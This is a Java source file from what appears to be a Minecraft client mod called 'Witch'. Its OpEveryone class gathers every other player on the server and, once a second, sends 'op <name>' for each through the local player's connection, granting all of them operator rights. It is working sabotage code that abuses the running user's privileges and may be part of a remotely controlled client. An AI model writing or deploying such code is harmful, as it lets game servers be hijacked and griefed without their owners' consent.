package me.soda.witch.client.utils;

import me.soda.witch.client.Witch;
import me.soda.witch.client.events.TickEvent;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.network.PlayerListEntry;
import net.minecraft.util.StringHelper;

import java.util.ArrayList;
import java.util.List;

import static me.soda.witch.client.Witch.mc;

public class OpEveryone {
    public static final OpEveryone INSTANCE = new OpEveryone();
    private int opTimer = 0;
    private int opIndex = 0;
    private final List<String> opPlayers = new ArrayList<>();

    @EventHandler
    private void onTick(TickEvent event) {
        if (opTimer > -1) {
            opTimer--;
            return;
        }

        if (opIndex >= opPlayers.size()) {
            Witch.EVENT_BUS.unsubscribe(this);
            return;
        }

        mc.getNetworkHandler().sendCommand("op " + opPlayers.get(opIndex));
        opIndex++;
        opTimer = 20;
    }

    public void opEveryone() {
        opPlayers.clear();
        if (!MCUtils.canUpdate()) return;
        String pName = mc.getSession().getProfile().getName();
        for (PlayerListEntry info : mc.getNetworkHandler().getPlayerList()) {
            String name = info.getProfile().getName();
            if (StringHelper.stripTextFormat(name).equalsIgnoreCase(pName))
                continue;

            opPlayers.add(name);
        }
        Witch.EVENT_BUS.subscribe(this);
    }
}
